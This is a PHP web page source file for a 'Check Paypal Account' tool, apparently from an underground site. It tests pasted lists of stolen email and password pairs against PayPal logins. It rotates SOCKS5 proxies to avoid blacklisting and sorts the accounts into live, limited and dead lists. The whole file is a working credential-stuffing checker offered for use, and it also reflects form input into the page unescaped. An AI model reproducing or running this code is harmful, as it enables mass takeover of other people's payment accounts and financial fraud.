<?php 

include error_reporting(0);
@set_time_limit(0);
session_save_path('cookie');
ini_set('session.gc_probability', 1);
$cookiejar = 'cookie/st'.rand(10000000000,99999999999).'123.txt'; 
@fclose(fopen($cookiejar,'w'));
global $cookiejar;


require_once('unf.class.php');
include('../unfaceguy.html');
?>
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>-[ Check Paypal Account v3 by EmXinhTT.Net]-</title>
<script type="text/javascript">
function timsock(){
	var sockslist = window.document.frmMain.s.value;
	var unf = sockslist.match(/\d{1,3}([.])\d{1,3}([.])\d{1,3}([.])\d{1,3}((:)|(\s)+)\d{1,8}/g );
	if(unf){
		var list="";
		for(var i=0;i<unf.length;i++){
			if(unf[i].match(/\d{1,3}([.])\d{1,3}([.])\d{1,3}([.])\d{1,3}(\s)+\d{1,8}/g )){
				unf[i]=unf[i].replace(/(\s)+/,':');
			}
			list=list+unf[i]+"\n";
		}
		window.document.frmMain.s.value=list;
	}
	else{
		window.document.frmMain.s.value="Error";
		window.location = "#";
	}
}
</script>
<link rel="stylesheet" type="text/css" href="../../css/default1.css">
</head>
<body>
<center>
<form name="frmMain" id="frmMain" method="post" action="">
	<div style="width:100%">
		<div style="width:90%">
			<p><center><h2><font color="#00CC33">-[ Check Paypal Account v3 by Unfaceguy]-</font></h2></center></p>
			<center><p><font color=red><b><blink>Auto check Mail Password and auto change sock if login success or limited </blink></b></font></p></center>

			<div id="mp" style="width:50%;float:left">
				<b>List Email & Password:</b>
			</div>
			<div id="mp" style="width:50%;float:left">
				<b>List Socks 5</b><br />
				(Auto Check Blacklist, Just add List Socks 5 but Recommend Socks Fresh/Private)
			</div>
			<div id="mp" style="clear:both;width:50%;float:left">
				<textarea rows="10" style="width:100%" name="mp" value=""><?php echo $_POST['mp'];?></textarea>
			</div>
			<div id="s" style="width:50%;float:left">
				<textarea rows="10" style="width:100%" name="s" value=""><?php echo $_POST['s'];?></textarea>
			</div>
		</div>
		<div style="width:90%;clear:both">
			<b>Delim : </b> <input type="text" name="split" size= 4 value="<?php if($_POST['split']){echo $_POST['split'];}else{ echo '|';}?>"/>
			<b>Mail : </b> <input type="text" name="mail" size= 4 value="<?php if($_POST['mail']){echo $_POST['mail'];}else{echo '1';}?>" />
			<b>Password : </b> <input type="text" name="pass" size= 4 value="<?php if($_POST['mail']){echo $_POST['pass'];}else{echo '2';}?>" />
			<b>TimeOut PP : </b> <select name="paypaltimeout" ><option value="10"  >10s</option><option value="9"  >9s</option><option value="8" selected >8s</option><option value="7"  >7s</option><option value="6"  >6s</option><option value="5"  >5s</option><option value="4"  >4s</option><option value="3"  >3s</option><option value="2"  >2s</option><option value="1"  >1s</option></select>
			<br><input type=checkbox name=checkmail> Check Email <input type=checkbox name=getinfo> Get Infomation<br>
            <b>Change Sock if DIE : </b><input type="text" name="diechange" size= 4 value="<?php if($_POST['diechange']){echo $_POST['diechange'];}else{echo '10';}?>" /> <br><br>
			<input type="submit" name="submit" value="      Check Now      " onClick="timsock();"/>
		</div>
		<br /><br /><br />
   </div>
</form>
</center>
</body>
</html>
<?php
if(isset($_POST['mp']) && isset($_POST['s']) && isset($_POST['pass']) && isset($_POST['paypaltimeout']) && isset($_POST['diechange'])){
	$slist = trim($_POST['s']); 
	$mlist = trim($_POST['mp']);
	$pp_timeout = trim($_POST['paypaltimeout']); 
	$slist = str_replace(array("\\\"","\\'"),array("\"","'"),$slist); 
	$slist = str_replace("\n\n","\n",$slist); 
	$mlist = str_replace(array("\\\"","\\'"),array("\"","'"),$mlist); 
	$mlist = str_replace("\n\n","\n",$mlist); 
	$slist = explode("\n", $slist);
	$mlist = explode("\n", $mlist);
	$email = trim($_POST['mail']);
	$splits = $_POST['split'];
	$pass = trim($_POST['pass']);
	$diechange= (int)$_POST['diechange'];
	$tsdie = "";
	$tslimit = "";
	$tslive = "";
	$tserror = "";
	$sldie = 0;
	$sllimit = 0;
	$sllive = 0;
	$slerror = 0;

	if(!$pass){
				die("<br />Please enter complete information.<br /><br />");
	}
	$unf= new Paypal;
	$j = 0;
	$dem_sl = 0;
	$maxs = 0;
	$unfaceguymail = count($mlist);
	$unfaceguysock=count($slist);
	$unfaceguy=0;
	$unfaceguycount=0;
	$markz=$unfaceguymail-1;
	for($i=0;$i<$unfaceguysock;$i++){

		$maxs = $maxs + 1;
		$_sockcheckto = $slist[$i];
		$_checkclear = $unf->CheckSock($slist[$i], $cookiejar, $pp_timeout);
		if ($_checkclear == "2"){
			echo " >>>>>USING $slist[$i]  <<<<< <br>";

			for($j=$unfaceguy;$j<$unfaceguymail;$j++)	
			{
				//$unfaceguycount++;

			$_mp = explode($splits, $mlist[$j]);
			$_mail = trim($_mp[($email - 1)]);
			$_pass = trim($_mp[($pass - 1)]);	
			if(strlen($_pass)>7){
				$paypal = $unf->isLogin($_mail, $_pass, $slist[$i],$splits, $cookiejar);
				$STT = $j + 1;
				if($paypal == "SOCKTIME"){
					echo $slist[$i]." <font color=orange> <<< Time Out</font><br>";
					$i++;
					break;
				}
				elseif($paypal == "SOCKBL"){
					echo $slist[$i]." <font color=red> <<< BlackList</font><br>";
					$i++;
					break;
				}
				elseif($paypal == "LIMITED"){
					echo "$STT. <b><font color=orange>LIMITED =></b></font> $_mail | $_pass | $slist[$i]<br>";
					$tslimit .= "<b><font color=orange>LIMITED =></b></font> $_mail | $_pass | $slist[$i]<br>";
					$sllimit++;
					$i++;
					$unfaceguy=$j+1;
					break;
				}
				elseif($paypal == "SECURITY"){
					echo "$STT. <b><font color=purple>SECURITY MEASURES =></b></font> $_mail | $_pass | $slist[$i]<br>";
					$tslimit .= "<b><font color=purple>SECURITY MEASURES =></b></font> $_mail | $_pass | $slist[$i]<br>";
					$sllimit++;
					$i++;
					$unfaceguy=$j+1;
					break;					
				}
				elseif($paypal == "PASSWORD"){
					echo "$STT. <b><font color=blue>CREATE PASSWORD =></b></font> $_mail | $_pass | $slist[$i]<br>";
					$tserror .= "<b><font color=blue>CREATE PASSWORD =></b></font> $_mail | $_pass | $slist[$i]<br>";
					$slerror++;
					$i++;
					$unfaceguy=$j+1;
					break;					
				}
				elseif($paypal == "DIE"){
					echo "$STT. <b><font color=red>DIE =></font></b> $_mail | $_pass | $_slist[$i]<br>";
					$tsdie .= "<b><font color=red>DIE =></font></b> $_mail | $_pass | $_slist[$i]<br>";
					$dem_sl = $dem_sl + 1;
					if($dem_sl == $diechange){
						$i = $i + 1;
						$dem_sl = 0;
						$unfaceguy=$j+1;
						break;
					}
					//$i++;
					//$unfaceguy=$j+1;
					$sldie++;
					//break;

				}
				elseif($paypal == "ERROR"){
					echo "$STT. <b><font color=blue>ERROR =></font></b> $_mail | $_pass | $_slist[$i]<br>";
					$tserror .= "<b><font color=blue>ERROR =></font></b> $_mail | $_pass | $_slist[$i]<br>";
					$dem_sl = $dem_sl + 1;
					if($dem_sl == $diechange){
						$i = $i + 1;
						$dem_sl = 0;
						$unfaceguy=$j+1;
						break;
					}
					
					$slerror++;
				}
				else{
					echo "$STT. <b><font color=green>LIVE =></b></font> $paypal";
					$tslive .= "<b><font color=green>LIVE =></b></font> $paypal";
					$sllive++;
					$i++;
					$unfaceguy=$j+1;
					break;	
				}
			}
				if($j==$markz)
				{
					$i=$i+10000;	
				}
			}
			//$j = $j + 1;

		}
		elseif($_checkclear == "1"){
			echo $slist[$i]." <font color=red> <<< Blacklist PayPal</font><br>";
		}elseif($_checkclear == "3"){
			echo $slist[$i]." <font color=orange> <<< Time Out</font><br>";
		}
		flush();
		sleep(1);
	}
	if($maxs > count($slist)){
		echo "<font color=blue><b>Over Sock !!!</b></font>";
	}else{
		echo "<font color=blue><b>Tool use to sock:".$_sockcheckto."</b></font>";
	}
	unlink($cookiejar);

	echo "<hr>";
	echo "<center><font size=5 color=blue>Total : <font size=6 color=red>".count($mlist)."</font> | Live : <font color=red size=6>".$sllive."</font> | Limit : <font color=red size=6>".$sllimit."</font> | Die : <font color=red size=6>".$sldie."</font> | Error : <font color=red size=6>".$slerror."</font></font></ce?ter><hr>";
	echo $tslive;
	echo "<hr>";
	echo $tslimit;
	echo "<hr>";
	echo $tsdie;
	echo "<hr>";
	echo $tserror;
	
}
?>
